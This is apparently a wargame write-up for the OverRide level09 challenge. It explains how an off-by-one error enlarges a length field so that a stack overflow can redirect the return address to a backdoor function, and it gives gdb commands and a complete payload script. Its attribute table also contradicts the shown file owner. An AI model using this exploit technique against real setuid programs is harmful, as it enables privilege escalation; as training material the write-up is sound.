# OverRide (level09)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/users/level09/level09`
- Type: **ELF 64-bit LSB executable** (`file -b ~/level09`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level09`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level09
-rwsr-s---+ 1 end users 12959 Oct  2  2016 /home/users/level09/level09
```

|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Owned by level09, so it runs with level09's effective uid: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level09
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ⚠️     | Partial. GOT is still writable but harder to reach.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ✅     | Stack/Heap are non-executable. Shellcode injection is not possible.
|       PIE       |    ✅     | The code, GOT and PLT are loaded at a randomized base. No fixed addresses to hardcode.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to two CWE vulnerabilities:
- "Off-by-one Error" ([CWE-193](https://cwe.mitre.org/data/definitions/193.html))
- "Stack-based Buffer Overflow" ([CWE-121](https://cwe.mitre.org/data/definitions/121.html))

## Weakness n°1

In the `set_username()` function, a copy loop writes 41 bytes into a 40-byte buffer *(`msg->username`)*, probably due to the usage of `<=` instead of `<` in the original code.

That extra byte lets us overwrite 1 byte in the adjacent field *(`msg->len`)*, so we can lie about the message length: raising it from 140 to at most 255 *(only its lowest byte is reachable)*.

## Weakness n°2

A later `strncpy()` call trusts `msg->len`, so the raised length lets us overflow past the buffer and overwrite the function's return address. We redirect it to the existing `secret_backdoor()` function, which runs `system()` on our input.

# Exploit

## Overwrite `msg->length`.

The first input we can provide is related to the `set_username()` function.  
It allows us to partially overwrite the value of `msg->len`.
```sh
# 255 <=> 0xFF <=> \377.
username_payload="$(printf '%-40s' '[...PADDING...]')\377";
```

## Overwrite `handle_msg()`'s return address.

The value of `msg->len` should be **140** but we set it to **255**, allowing us to perform a stack buffer overflow.

Due to the [NX](https://ctf101.org/binary-exploitation/no-execute/) option being active, we cannot execute injected shellcode directly from the stack, but we can redirect control flow to the `secret_backdoor()` function which executes `system()` on our input.

`msg` is declared in `handle_msg()` and referenced via a pointer in function calls. Any overflow in `msg` could thus have consequences in the parent function.

Our overflow starts on `msg->body`. `msg` being the only variable of the function, we can easily work out the offset needed to reach the return address by hand: `sizeof(t_message)` + `frame alignment padding` + `saved RBP`. That means **184 + 8 + 8 = 200 bytes** of padding before the return address.

We also need `secret_backdoor()`'s address, the target of our overflow. [PIE](https://en.wikipedia.org/wiki/Position-independent_code) would normally randomize it per run, but [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is disabled, so the address is the same every time. We just read it once in a debugger and hardcode it:
```sh
gdb -quiet -batch \
    -ex 'break main' \
    -ex 'run' \
    -ex 'printf "%#lx\n", (long)secret_backdoor' \
    ~/level09 </dev/null;
# 0x55555555488c
```
Which in little endian octal sequence is: `\214\110\125\125\125\125\000\000`.

```sh
octal_addr_secret_backdoor='\214\110\125\125\125\125\000\000'; # 0x55555555488c
msg_payload="$(printf '%-200s' '[...PADDING...]')$octal_addr_secret_backdoor";
```

## Solution

```sh
octal_addr_secret_backdoor='\214\110\125\125\125\125\000\000'; # 0x55555555488c
username_payload="$(printf '%-40s' '[...PADDING...]')\377"; # Set msg->len to 255.
msg_payload="$(printf '%-200s' '[...PADDING...]')$octal_addr_secret_backdoor"; # Overflow ret addr to secret_backdoor.

(printf '%b\n' "$username_payload"; printf '%b\n' "$msg_payload"; cat -) | ~/level09
```

And there we are !
